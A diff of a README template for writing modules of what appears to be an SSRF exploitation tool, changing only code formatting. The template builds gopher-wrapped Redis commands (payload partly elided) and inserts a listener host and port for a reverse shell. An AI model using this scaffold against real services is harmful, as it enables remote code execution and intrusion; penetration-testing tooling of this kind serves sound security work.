@@ -147,12 +147,13 @@ The following code is a template if you wish to add a module interacting with a 
 from core.utils import *
 import logging
 
-name          = "servicename in lowercase"
-description   = "ServiceName RCE - What does it do"
-author        = "Name or pseudo of the author"
+name = "servicename in lowercase"
+description = "ServiceName RCE - What does it do"
+author = "Name or pseudo of the author"
 documentation = ["http://link_to_a_research", "http://another_link"]
 
-class exploit():
+
+class exploit:
     SERVER_HOST = "127.0.0.1"
     SERVER_PORT = "4242"
 
@@ -160,11 +161,15 @@ class exploit():
         logging.info("Module '{}' launched !".format(name))
 
         # Handle args for reverse shell
-        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
-        else:                  self.SERVER_HOST = args.lhost
+        if args.lhost == None:
+            self.SERVER_HOST = input("Server Host:")
+        else:
+            self.SERVER_HOST = args.lhost
 
-        if args.lport == None: self.SERVER_PORT = input("Server Port:")
-        else:                  self.SERVER_PORT = args.lport
+        if args.lport == None:
+            self.SERVER_PORT = input("Server Port:")
+        else:
+            self.SERVER_PORT = args.lport
 
         # Data for the service
         # Using a generator to create the host list
@@ -173,7 +178,7 @@ class exploit():
         for ip in gen_host:
             port = "6379"
             data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
-            payload = wrapper_gopher(data, ip , port)
+            payload = wrapper_gopher(data, ip, port)
 
             # Handle args for reverse shell
             payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
